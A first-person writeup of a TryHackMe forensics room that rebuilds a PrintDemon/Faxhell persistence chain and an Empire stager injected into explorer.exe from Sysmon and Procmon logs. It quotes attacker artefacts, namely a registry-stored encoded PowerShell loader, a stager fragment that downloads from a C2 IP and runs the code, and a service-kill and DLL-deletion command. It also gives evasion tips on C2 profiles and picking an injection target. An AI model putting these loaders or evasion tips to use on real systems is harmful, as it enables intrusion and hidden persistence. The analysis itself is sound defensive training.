---
layout: writeup
lang: en
permalink: /en/writeups/investigating-windows-3/
title: "Investigating Windows 3.x"
ref: investigating-windows-3
date: 2026-09-01
bare: true
platform: THM
os: Windows Server 2019
difficulty: Medium
series: thm-windows
tags: [win, dfir, sysmon, empire, printdemon, injection, procmon]
txt: /writeups-files/investigating-windows-3-en.txt
summary: "Two different attacks on the same machine: a backdoor hooked into the Windows print service, and the Empire framework hidden inside explorer.exe, the desktop process."
---

# Writeup — Investigating Windows 3.x (TryHackMe)

OS: Windows Server 2019 (build 17763)
Difficulty: Medium
Date: 14 September 2026

---

## Summary

third room of the series, host SysIntChallenge, thirty questions, zero exploitation: you get in over RDP as Administrator and read the machine. the difference from the first two is that here most of the answers aren't in the native logs but inside Sysmon and inside a Logfile.PML left on the desktop, and that there are two distinct chains to reconstruct: a persistence implant on the Print Spooler in PrintDemon/Faxhell style, and an Empire stager injected inside explorer.exe.

I had given myself a limit of thirty minutes of session. I didn't keep to it, and the reason wasn't the analysis but the RDP clipboard freezing every couple of commands. the actual investigative part, once the right method was set up, went smoothly

---

## additional tools and methodology

an llm was used during the session: for looking up CVE details, interpreting raw output, suggesting unexplored vectors when stuck, detailed explanation of technical concepts and correcting syntax in long commands. the execution and the operational decisions were mine. the writeup was written by me and later cleaned up with the same tool.

for the semantics of the Sysmon event IDs and for the command-line options of Process Monitor I referred to the Microsoft documentation:
https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
https://learn.microsoft.com/en-us/sysinternals/downloads/procmon

for Empire's default communication profile and for the process injection module:
https://bc-security.gitbook.io/empire-wiki
https://github.com/EmpireProject/PSInject

the user's SID and other machine identifiers have been masked with asterisks at publication time where not necessary.

---

## Preface

Kali virtualised, RDP to 10.114.130.250 with the room credentials, Administrator / blueT3aming!.

problem number one of this session wasn't technical but transport: rdpclip kept freezing and the machine would neither copy nor paste. in a room where you have to move base64 strings of five thousand characters, that's a real blocker. the classic remedy

taskkill /f /im rdpclip.exe & start rdpclip

works but lasts only a few minutes. my idea of making it persistent was the worst of the whole session:

schtasks /create /tn rdpclipfix /tr "cmd /c taskkill /f /im rdpclip.exe & start rdpclip" /sc minute /mo 2 /ru Administrator /it /rl highest /f

because killing rdpclip every two minutes means breaking the channel exactly at the moment you're copying. I removed it as soon as I realised

schtasks /delete /tn rdpclipfix /f
SUCCESS: The scheduled task "rdpclipfix" was successfully deleted.

I also tried to bypass the clipboard by mounting the administrative share from Kali

sudo mount -t cifs //10.114.130.250/C$ /mnt/win -o username=Administrator,password='blueT3aming!',vers=3.0

but it didn't get through on this VPN and I preferred not to burn more minutes on it. the final compromise was restarting rdpclip from PowerShell with a wait,and from then on writing commands that print few lines at a time:

powershell -NoProfile -Command "Stop-Process -Name rdpclip -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 2; Start-Process -FilePath rdpclip.exe; Start-Sleep -Seconds 2; Get-Process rdpclip &#124; Select-Object Id,SessionId"

Id SessionId
&#45;&#45; &#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;-
4528         2

two details worth putting here because they cost me time and aren't syntax errors. the first: every so often the pasted line arrived duplicated and the prompt answered

'C:\Users\Administrator' is not recognized as an internal or external command

there's nothing wrong with the command, it's the paste that doubled up. the second: halfway through the session the PATH variable of the cmd window broke and both findstr and powershell came out as "not recognized". it's solved by calling the executable by absolute path

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command "&#46;&#46;&#46;"

last thing: the machine ran out of RAM several times when opening the large log files, and I had to restart it quite a few times. the questions from 15 onwards I closed in pieces, between one restart and the next

---

## Phase 1 — Exporting the logs before touching anything else

first thing of all, before even looking at the desktop. on a lab machine the logs rotate and the session expires, so you take everything to file and then query the file, not the live log. wevtutil epl does exactly this and opens no GUI.

powershell -NoProfile -Command "mkdir C:\ir -Force &#124; Out-Null; 'Microsoft-Windows-Sysmon/Operational','System','Security','Microsoft-Windows-PrintService/Operational' &#124; ForEach-Object { wevtutil epl $_ ('C:\ir\' + ($_ -replace '[/\\-]','_') + '.evtx') /ow:true }"

the first attempt I had launched inside cmd and obviously it died:

'Out-Null' is not recognized as an internal or external command

it was a PowerShell pipeline inside a cmd prompt. trivial, but when you're in a hurry that's sixty seconds thrown away.

from the exported .evtx files I then pulled out the text dumps I query in the following phases, one per EventID, always filtering server-side:

for %i in (1 3 7 8 13 22) do wevtutil qe C:\ir\Microsoft_Windows_Sysmon_Operational.evtx /lf:true /q:"*[System[(EventID=%i)]]" /f:text > C:\ir\ev%i.txt

the names I use further on (reg13.txt, proc1.txt, net3.txt) are those files renamed for readability.

on filtering I ran into a real limit of wevtutil: XPath queries with contains() aren't supported

wevtutil qe &#46;&#46;&#46; /q:"*[System[EventID=13]][EventData[Data[@Name='TargetObject'] and (contains(Data,'Run'))]]"
This operator is unsupported by this implementation of the filter.
Failed to open event query.
The specified query is invalid.

so the correct pattern is: XPath only on the EventID (server-side, fast), dump to a text file, and filter on the content from PowerShell or findstr. not the other way round, because Get-WinEvent with a client-side filter on a Security log of a hundred thousand events just hangs.

---

## Phase 2 — The Run key that doesn't contain the payload

questions 1-5. from the dump of EventID 13 I pulled out all the TargetObject entries with "Run" in them:

powershell -NoProfile -Command "Select-String -Path C:\ir\reg13.txt -SimpleMatch 'TargetObject:' &#124; Select-String -SimpleMatch 'Run' &#124; Select-Object -First 10 -ExpandProperty Line"

TargetObject: HKU\S-1-5-21-****\Software\Microsoft\Windows\CurrentVersion\Run\Updater
TargetObject: HKU\S-1-5-21-****_Classes\Autoruns.Logfile.1\shell\open\command\(Default)
TargetObject: HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\{ca72b496-****}

I discarded the other two immediately and it's worth saying why: the second is the registration of Autoruns' file association, that is an artefact of whoever prepared the machine or of an analyst who worked on it before, the third is a RunOnce with a GUID typical of an MSI installer. that leaves Run\Updater. full context:

RuleName: technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder
EventType: SetValue
UtcTime: 2021-01-22 01:08:13.468
ProcessGuid: {786593ca-776d-6009-4b00-000000000300}
ProcessId: 2684
Image: C:\Windows\Explorer.EXE
TargetObject: HKU\S-1-5-21-****-500\Software\Microsoft\Windows\CurrentVersion\Run\Updater
Details: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"

here is the point of question 1, and the answer isn't the one you'd give off the cuff. the Run key doesn't contain the payload, it contains a two-line loader that goes and reads the payload from another key. the base64 blob is in

HKCU\Software\Microsoft\Windows\CurrentVersion\Debug

and from the offensive side this is the most interesting thing in the whole first half of the room. keeping the code outside the autorun key gives you two things: the Run key stays short and doesn't stand out in a quick triage, and the real payload lives in a value called "Debug" under CurrentVersion, which looks like system stuff and nobody opens. whoever does the standard check reads the Run key, sees powershell -enc, and looks for the base64 in there without finding it.

the other thing to note: the process that writes the key is Explorer.EXE, PID 2684. explorer writing a Run key with a PowerShell loader inside it is already in itself the signature of an injection, and indeed it all ties together in phase 6

---

## Phase 3 — First payload decoded

questions 6-9. the Debug value is still in the hive, so you read it and decode it on the fly. note that it's a value, not a subkey: the first attempt died like this

Cannot find path 'HKCU:\Software\Microsoft\Windows\CurrentVersion Debug' because it does not exist.

the correct form uses -Name:

powershell -NoProfile -Command "$x=(Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion' -Name Debug).Debug; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($x)) &#124; Out-File C:\ir\payload.txt"

the decoded content is one giant block with no line breaks, so to read it I split it on the semicolons instead of printing it:

powershell -NoProfile -Command "(gc C:\ir\payload.txt -Raw) -split '[;\r\n]+' &#124; sls 'sc &#124;port&#124;kill&#124;\.dll' &#124; select -First 8"

$FTPPort = "9299"
$tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort)

FTP service, port 9299. inside the same payload there is a second nested base64 blob, and that one contains the destructive part:

kill (Get-Process FXSSVC).Id -force; Remove-Item -path 'C:\Windows\System32\ualapi.dll'

FXSSVC is the Fax service and ualapi.dll is the DLL that service loads. the pair is the signature of PrintDemon / Faxhell (CVE-2020-1048): you abuse the Print Spooler to have an arbitrary DLL written into System32, then the Fax service loads it as a provider and you end up with code running as SYSTEM. what we see here is the tail of the chain, that is the cleanup: the payload kills the service and deletes the DLL planted earlier.

in the same decoded content the AMSI bypass also appears, the usual SetValue on amsiInitFailed. I noted it but it isn't needed for any question

---

## Phase 4 — The printer that doesn't print anything

questions 10-13. here I started badly. I had assumed "New Default Printer" was a log entry and burned three commands:

findstr /i /n /c:"printer" C:\ir\system.txt C:\ir\print.txt

zero results, because PrintService/Operational on this machine is essentially empty. I turned it around and went to the user hive, where the default printer always lives:

reg query "HKU\S-1-5-21-****-500\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Device

    Device    REG_SZ    PrintDemon,winspool,Ne02:

printer PrintDemon on port Ne02:. and here the other EventID 13 that I already had in the dump slots in:

RuleName: technique_id=T1547.010,technique_name=Boot or Logon Autostart Execution - Port Monitors
EventType: SetValue
UtcTime: 2021-01-26 17:55:34.983
ProcessId: 1940
Image: C:\Windows\System32\spoolsv.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Ports\Ne02:
Details: (Empty)

T1547.010, port monitors: the port is registered by the spooler and becomes the channel through which the DLL ends up where it shouldn't. the associated process is spoolsv.exe.

I only got to the right log for question 10 afterwards: it isn't System and it isn't Operational, it's PrintService/Admin, and it's the same record that names the new default printer

powershell -NoProfile -Command "Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PrintService/Admin'} &#124; Select-Object -First 3 Id,TimeCreated,Message &#124; Format-List"

Id : 823
Message : The default printer was changed to PrintDemon&#46;&#46;&#46;

for the parent PID I took the shortcut of querying WMI on the live process instead of digging into the PML:

powershell -NoProfile -Command "Get-CimInstance Win32_Process -Filter \"Name='spoolsv.exe'\" &#124; Select-Object ProcessId,ParentProcessId"

ProcessId 1876, ParentProcessId 632, and 632 is services.exe. a discrepancy to note: in the Sysmon event of 26 January spoolsv had PID 1940, now it has 1876. these are different sessions, the machine was restarted in the meantime. the parent however stays 632 because the spooler is always a child of services.exe, and that's what the question asks for

---

## Phase 5 — The second payload, that is the Empire stager

questions 14-18. the Run key payload isn't the only one. searching the process create events with -enc:

powershell -NoProfile -Command "$c=Get-Content C:\ir\proc1.txt; for($i=0;$i -lt $c.Count;$i++){ if($c[$i] -match '\-enc'){ ($c[($i-6)..$i] &#124; Where-Object {$_ -like '*ProcessId:*'}) + ' LEN=' + $c[$i].Length } }"

ProcessId: 3088  LEN=5197

five thousand characters of base64 on one line, and this is the line the clipboard refused to give me. I decoded it directly on the machine instead of carrying it out, extracting the blob with a regex and trying Unicode with an ASCII fallback, because depending on how it was generated the encoding changes:

powershell -NoProfile -Command "$c=Get-Content C:\ir\proc1.txt; foreach($l in $c){ if($l -match '\-enc'){ $m=[regex]::Match($l,'[A-Za-z0-9+/=]{200,}'); $b=[Convert]::FromBase64String($m.Value); $s=[Text.Encoding]::Unicode.GetString($b); if($s -notmatch '[a-z]{4}'){ $s=[Text.Encoding]::ASCII.GetString($b) }; Set-Content C:\ir\enc2.txt $s -Encoding ASCII; break } }"

the first pass with Unicode only had returned the string with a space between every character, which at the time made me think of a corrupted payload and instead was just the wrong encoding on read.

the decoded content is a stager recognisable at a glance:

$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
$ser=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAzADQALgAyADQANQAuADEAMgA4AC4AMQA2ADEAOgA5ADAAMAAxAA=='))
$t='/admin/get.php'
$27CE.Headers.Add('User-Agent',$u)
$27CE.PRoXY=[SysTem.NET.WEBREqUesT]::DEFAUlTWEBPROXY
$27CE.Headers.Add("Cookie","RjMeek=ZmQLHacMBXrLcB+VElvLcwO26EY=")
$DaTA=$27CE.DOwnloADdATA($Ser+$T)
$iv=$DaTA[0..3]; $DaTA=$dATA[4..$DAta.lENgth]

fixed User-Agent, session cookie, path /admin/get.php, XOR/RC4 decrypt and a final IEX. the server inside the base64 inside the base64 is http://34.245.128.161:9001

/admin/get.php is the piece that identifies the framework: it's one of the three endpoints of Empire's default communication profile. the variable that holds that profile in the listener is called DefaultProfile, and the other two paths you'd expect in the logs are /news.php and /login/process.php. Empire on ATT&CK is S0363, so https://attack.mitre.org/software/S0363/

my own note from the offensive side: the default profile of a C2 is the stupidest thing that burns you on a red team. three fixed paths and a hardcoded IE11 User-Agent mean that any defence with a well-written rule catches you on the first beacon. the same infrastructure with a custom profile consistent with the environment's traffic leaves no signature of this kind

---

## Phase 6 — The connections and the injection

questions 19-24. on the EventID 3 events I grouped by destination IP instead of reading them one by one, because there are hundreds:

powershell -NoProfile -Command "Get-Content C:\ir\net3.txt &#124; Where-Object {$_ -like '*DestinationIp:*'} &#124; Group-Object -NoElement &#124; Sort-Object Count -Descending &#124; Select-Object -First 10 Count,Name"

Count Name
&#45;&#45;&#45;&#45;- &#45;&#45;&#45;&#45;
   25 DestinationIp: 10.60.0.230
   17 DestinationIp: 169.254.169.254
    8 DestinationIp: 0:0:0:0:0:0:0:1
    2 DestinationIp: 88.221.16.244
    2 DestinationIp: 10.10.83.237
    2 DestinationIp: 34.245.128.161
    2 DestinationIp: 93.184.220.29

here I made the mistake of chasing the highest count first. 10.60.0.230 with 25 hits is svchost and System, that is internal AWS network traffic, and 169.254.169.254 is the EC2 metadata endpoint, infrastructure stuff and not the attacker's. volume isn't a criterion, the process is. refiltering by process:

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe DestinationIp: 34.245.128.161 DestinationPort: 9001
Image: C:\Windows\explorer.exe DestinationIp: 34.245.128.161 DestinationPort: 9001

two processes, same destination, same port 9001, the same one that was inside the nested base64 of the stager. the DestinationHostname in the logs is empty because the connection went straight to an IP, but the EC2 naming convention is deterministic and DNS confirms it for us: ec2-34-245-128-161.eu-west-1.compute.amazonaws.com. which incidentally matches the internal DNS query I had fished out of the EventID 22 events, _ldap._tcp.dc._msdcs.eu-west-1.compute.internal, same region.

the second process is explorer.exe, PID 2684, that is exactly the one that had written the Run key in phase 2. at this point the picture is closed: powershell 3088 injected into explorer 2684. the confirmation is in the EventID 8 events:

UtcTime: 2021-01-22 01:07:06.182
SourceProcessId: 3088
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessId: 2684
TargetImage: C:\Windows\explorer.exe

CreateRemoteThread, event ID 8, first occurrence at 01:07:06.182 UTC. in the same dump there are two other EventID 8 events from vmtoolsd.exe towards csrss.exe: those are VMware Tools, I discarded them because the source is signed and the pattern is the agent's normal one, not an injection.

a temporal sequence that reassembles itself: injection at 01:07:06, and the Run key written by explorer at 01:08:13, one minute and seven seconds later. first you get into the process, then from inside the clean process you write your persistence. that way the Run key comes out as created by explorer.exe and not by a suspicious powershell

---

## Phase 7 — Procmon and the WMI stack

questions 22 and 25-30. on the desktop there was a Logfile.PML already prepared. the GUI on this machine is a risk, so I first tried the headless conversion:

cmd /c "C:\Tools\Sysint\Procmon.exe /OpenLog C:\Users\Administrator\Desktop\Logfile.PML /SaveAs C:\ir\pml.csv /Quiet /AcceptEula"

it works and gives you a CSV queryable with Import-Csv. the first record:

Time of Day  : 6:05:37.8916959 PM
Process Name : Sysmon.exe
PID          : 1308
Operation    : RegQueryKey
Path         : HKU
Result       : SUCCESS

here is the reasoning that unlocks three questions at once. the capture covers 6:05:37 - 6:09:17 PM local time, while Sysmon logs in UTC and the injection is at 01:07:06 on 22 January. the machine is on UTC-7, so 01:07:06 UTC on the 22nd is 6:07:06 PM on the 21st locally, that is inside the capture window. the value under Date and Time is 1/21/2021 6:07:06 PM.

the first operation of explorer.exe from that timestamp:

powershell -NoProfile -Command "Import-Csv C:\ir\pml.csv &#124; Where-Object {$_.PID -eq '2684' -and $_.'Time of Day' -like '6:07:0*PM'} &#124; Select-Object -First 4 'Time of Day',Operation,Path &#124; Format-List"

Operation : Thread Create

which is the canonical sequence: the remote thread created by the injection appears as Thread Create inside the target process. to get there I first dumped the first ten rows with no column filter and got lost in the output, the filter on the time window is what makes it readable.

the first image load of explorer in that window I took from the GUI because with Sysmon nothing useful came out (EventID 7 for PID 2684 returned wmiutils.dll, which is the subsequent WMI load, not the first one):

C:\Windows\System32\mscoree.dll

and it's consistent with everything else: mscoree.dll is the CLR host, that is .NET being loaded inside explorer. explorer.exe has no reason to load the .NET runtime during normal use, and this is one of the cleanest indicators of managed code injection you can get.

the attacker's reconnaissance shows up in the registry query:

powershell -NoProfile -Command "Import-Csv C:\ir\pml.csv &#124; Where-Object {$_.Path -like '*CurrentVersion\ProductId*'} &#124; Select-Object -First 4 'Time of Day','Process Name',PID,Operation,Path,Result &#124; Format-List"

Time of Day  : 6:05:49.8784612 PM
Process Name : wmiprvse.exe
PID          : 2964
Operation    : RegQueryValue
Path         : HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductId
Result       : BUFFER OVERFLOW

Time of Day  : 6:05:49.8784740 PM
Process Name : wmiprvse.exe
PID          : 2964
Operation    : RegQueryValue
Path         : HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductId
Result       : SUCCESS

the BUFFER OVERFLOW followed by SUCCESS microseconds apart isn't an error, it's the normal pattern of RegQueryValue: a first call to be told the buffer size, a second one with the right buffer. the one with SUCCESS is the one to open.

the stack of that event is the best piece of evidence in the whole room:

<div class="writeup-image">
  <img src="/assets/writeups/iw3-procmon-stack.png" alt="Stack of the RegQueryValue event in Process Monitor">
  <div class="img-caption">The stack of the event: from the bottom the incoming RPC call, then wmiprvse.exe, the WMI provider and the query to the registry</div>
</div>

it reads from the bottom upwards and tells the complete chain: RPCRT4 and combase at the bottom (an incoming RPC call), then wmiprvse.exe, then framedynos.dll with CWbemProviderGlue::CreateInstanceEnumAsync, then cimwin32.dll with CRegistry::GetCurrentKeyValue, and at the top KERNELBASE and ntoskrnl doing the actual query. translated: somebody asked for system information over WMI, the WMI provider resolved it by reading the registry, and the registry access comes out as done by wmiprvse.exe and not by the attacker's process. it's WMI used as a proxy for reconnaissance, which is why looking for "who read ProductId" by examining suspicious processes gets you nowhere.

the last module of the stack with a valid result is ntdll.dll, frame 36, RtlUserThreadStart, that is the bottom of the user stack.

the framework module used between the two processes is Invoke-PSInject, Empire's process injection module, which is exactly what generates a CreateRemoteThread towards a legitimate process and loads the managed runtime into it. technique T1055.

---

## Full chain

reconstructed timeline, times in UTC, machine on UTC-7 for Procmon's local times.

2021-01-21 19:52:53  powershell.exe PID 3088 already active with network activity, it's the process hosting the stager
2021-01-22 01:07:06  CreateRemoteThread from powershell 3088 towards explorer.exe 2684 (Invoke-PSInject, T1055)
2021-01-22 01:07:06  (local 1/21 6:07:06 PM) first effect inside explorer: Thread Create
2021-01-22 01:07:0*  explorer loads mscoree.dll, that is the .NET CLR inside the shell process
2021-01-22 01:07:09  explorer loads wmiutils.dll, WMI use from the injected process begins
2021-01-22 01:05-01:09  reconnaissance over WMI: wmiprvse.exe 2964 queries HKLM\&#46;&#46;&#46;\CurrentVersion\ProductId
2021-01-22 01:08:13  explorer.exe 2684 writes HKCU\&#46;&#46;&#46;\CurrentVersion\Run\Updater (T1547.001)
                     the Run value contains only a loader, the base64 payload goes into &#46;&#46;&#46;\CurrentVersion\Debug
&#45;&#45;                   beaconing towards ec2-34-245-128-161.eu-west-1.compute.amazonaws.com:9001
                     Empire default profile, /admin/get.php, hardcoded IE11 UA
2021-01-26 17:55:34  spoolsv.exe writes HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Ports\Ne02:
                     (T1547.010, port monitor) and the default printer becomes PrintDemon, event 823
&#45;&#45;                   PrintDemon/Faxhell chain: DLL written into System32 and loaded by the Fax service
&#45;&#45;                   cleanup payload: opens FTP on 9299, kills FXSSVC, removes C:\Windows\System32\ualapi.dll

the attacker's logic runs on two separate levels and this is the reason the room confuses you. level one is Empire: injection into explorer, C2, WMI reconnaissance, persistence in Run. level two is PrintDemon: spooler abuse for privilege escalation to SYSTEM via the Fax service provider, complete with final cleanup. they are two chains that share only the machine, and if you try to read them as one nothing adds up.

what I take away from the offensive side is the choice of injection target. explorer.exe is the perfect process because it's always alive, it belongs to the interactive user, it makes network traffic of its own and it writes to the user registry constantly. a Run key written by explorer doesn't jar, written by powershell it does. what gives everything away is mscoree.dll: explorer loading the CLR is an anomaly with no benign explanation, and none of the techniques used here manages to hide it.

---

## Room answers

1.  HKCU\Software\Microsoft\Windows\CurrentVersion\Debug
2.  T1547.001
3.  Persistence, Privilege Escalation
4.  2021-01-22 01:08:13.468
5.  13, SetValue
6.  FTP
7.  9299
8.  FXSSVC
9.  C:\Windows\System32\ualapi.dll
10. 823
11. PrintDemon
12. spoolsv.exe
13. 632
14. 3088
15. /admin/get.php
16. Empire, DefaultProfile
17. /news.php, /login/process.php
18. https://attack.mitre.org/software/S0363/
19. ec2-34-245-128-161.eu-west-1.compute.amazonaws.com
20. explorer.exe
21. 2684
22. C:\Windows\System32\mscoree.dll
23. CreateRemoteThread, 8
24. 2021-01-22 01:07:06.182
25. 1/21/2021 6:07:06 PM
26. Thread Create
27. HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductId
28. ntdll.dll
29. Invoke-PSInject
30. T1055

---

## Lessons learned

the first lesson isn't technical and it's the one that cost me most: the working channel is part of the problem. I lost more time on rdpclip than on the analysis, and the worst move was automating the fix without thinking about what that automation was doing while I worked. when the transport tool is unstable the answer isn't to keep repairing it, it's to stop depending on it: writing everything to C:\ir and printing three lines at a time is what eventually got me through the room.

the second is about time zones. Sysmon logs UTC, Procmon logs local time, and the room asks you for the same thing in two different formats in two consecutive questions. without working out the machine's offset the PML capture window seems not to contain the event and you convince yourself you have the wrong file. you derive the offset from the data itself, by comparing two events you know to be the same one.

the third is about volume as a criterion. grouping the EventID 3 events by IP and chasing the highest count took me straight to the AWS metadata endpoint. on a cloud machine noisy traffic is almost always infrastructure, and the discriminant is the process opening the connection, not how many times it opens it. two connections from explorer.exe are worth more than twenty-five from svchost.

the fourth is that the analyst's artefacts are everywhere. Autoruns.Logfile in the keys, Procmon64.exe in its own stack, Sysmon.exe as the first record of the capture. on a machine already analysed by others before you, half of what looks like activity should be attributed to whoever worked on it, not to the attacker.

on the technical side, what stays with me is reconnaissance over WMI. it wasn't clear to me before this room that reading the registry through a WMI provider means the access comes out as done by wmiprvse.exe, with your process appearing nowhere in the Process Name column. to see it you have to open the stack, and the stack only exists if you have a Procmon capture. without that file that part of the chain was invisible

---

## Tools used

xfreerdp, RDP, wevtutil (epl, qe with XPath), PowerShell (Select-String -SimpleMatch, Import-Csv, [Convert]::FromBase64String, Get-CimInstance, Get-WinEvent -FilterHashtable), reg query, findstr /c:, Sysinternals Process Monitor (headless /OpenLog /SaveAs and GUI for the Stack tab), Sysmon (event IDs 1, 3, 7, 8, 13, 22), Autoruns
